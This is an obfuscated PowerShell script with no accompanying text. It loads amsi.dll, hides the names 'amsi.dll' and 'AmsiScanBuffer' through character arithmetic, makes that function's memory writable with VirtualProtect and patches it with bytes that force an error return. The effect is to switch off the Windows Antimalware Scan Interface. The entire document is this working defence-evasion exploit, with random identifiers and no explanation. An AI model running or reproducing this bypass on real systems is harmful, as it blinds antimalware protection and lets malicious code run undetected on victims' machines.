$Y_CcWk0QHwu = @"
using System;
using System.Runtime.InteropServices;
public class Y_CcWk0QHwu {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hXZ0MhGjayD, string Qi8d01YyVVSuR8w);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Z_hG, UIntPtr VD7WD6TAxJv9E, uint YgqooSWL, out uint WRmz2Qwz);
}
"@

Add-Type $Y_CcWk0QHwu

$SIOR = [Y_CcWk0QHwu]::LoadLibrary("$(('àm'+'sî'+'.d'+'ll').nOrmALIze([CHAR]([ByTe]0x46)+[cHaR](111)+[cHAr](114*5/5)+[cHAR]([byte]0x6d)+[Char](68+22-22)) -replace [cHAr]([bYte]0x5c)+[cHAr](101+11)+[ChAR]([BYTe]0x7b)+[chAR]([bYtE]0x4d)+[chAr](79+31)+[cHAr]([BYTE]0x7d))")
$EBLlCNZJTvV19T = [Y_CcWk0QHwu]::GetProcAddress($SIOR, "$([cHaR](65+46-46)+[ChAr]([BYTe]0x6d)+[CHar]([BYTe]0x73)+[CHaR](105*33/33)+[CHar]([bYte]0x53)+[CHAR](99)+[ChaR]([BYTe]0x61)+[chAR](110*107/107)+[CHaR]([Byte]0x42)+[chAR](117)+[CHAR]([bYtE]0x66)+[char](31+71)+[CHAr]([BytE]0x65)+[ChaR](114*71/71))")
$p = 0
[Y_CcWk0QHwu]::VirtualProtect($EBLlCNZJTvV19T, [uint32]5, 0x40, [ref]$p)
$KHzKC6lqC_wECPtrIC_Q = "0xB8"
$qn1UqqbiHH18St = "0x57"
$ILczKGUYp8E3RK = "0x00"
$vnuKKH1quP = "0x07"
$NHX9 = "0x80"
$TQ5hYTT0IkYz0IXYXhiT = "0xC3"
$mikUV = [Byte[]] ($KHzKC6lqC_wECPtrIC_Q,$qn1UqqbiHH18St,$ILczKGUYp8E3RK,$vnuKKH1quP,+$NHX9,+$TQ5hYTT0IkYz0IXYXhiT)
[System.Runtime.InteropServices.Marshal]::Copy($mikUV, 0, $EBLlCNZJTvV19T, 6)